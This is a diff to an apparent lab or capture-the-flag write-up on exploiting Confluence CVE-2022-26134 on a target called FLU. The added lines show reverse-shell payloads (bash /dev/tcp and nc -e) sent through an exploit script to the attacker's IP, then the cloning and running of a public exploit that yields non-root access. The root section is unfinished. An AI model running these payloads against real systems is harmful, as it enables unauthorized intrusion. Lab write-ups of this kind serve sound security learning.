@@ -75,5 +75,39 @@ We can run simple commands. Let's try for a reverse shell.
 ip a | grep 192 #192.168.49.54 = attacker ip
 nc -nvlp 4444
 
+# on attacker too, to trigger rev shell
+python CVE-2022-26134.py http://FLU:8090 "bash -i >& /dev/tcp/192.168.49.54/4444"
+# this fails, but we have nc!!
+
+python CVE-2022-26134.py http://FLU:8090 "which nc"
+# this proves we have nc
+
+# on attacker, to trigger reverse shell
+python CVE-2022-26134.py http://FLU:8090 "nc -e /bin/sh 192.168.49.54 4444"
+# this fails too, let's try python3 shell
+
+
 ```
+
+We give up and find a new exploit.
+
+https://github.com/jbaines-r7/through_the_wire/blob/main/through_the_wire.py
+
+```bash
+git clone https://github.com/jbaines-r7/through_the_wire/
+
+cd ./through_the_wire/
+
+# run on attacker
+python through_the_wire.py --rhost FLU --rport 8090 --lhost 192.168.49.54 --lport 4444 --protocol "http://" --reverse-shell
+```
+
+It works.
+
+![](Pasted%20image%2020260412205901.png)
+
+We have non-root access.
 # Root access
+
+To get root access, well, we don't know because I'm live-writing this :)
+
